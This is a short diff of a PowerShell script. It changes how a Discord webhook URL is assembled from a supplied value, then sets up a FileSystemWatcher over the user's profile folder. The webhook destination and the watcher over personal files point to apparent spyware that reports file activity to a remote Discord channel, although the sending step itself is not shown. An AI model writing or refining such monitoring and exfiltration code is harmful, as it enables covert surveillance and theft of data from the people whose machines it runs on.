@@ -1,6 +1,7 @@
-﻿$whuri = "$dc"
- # shortened URL Detection
-if ($whuri.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $whuri = (irm $whuri).url}
+$whuri = "$dc"
+if ($whuri.Length -lt 120){
+	$whuri = ("https://discord.com/api/webhooks/" + "$dc")
+}
 
 $watcher = New-Object System.IO.FileSystemWatcher -Property @{
     Path = $env:USERPROFILE + '\'
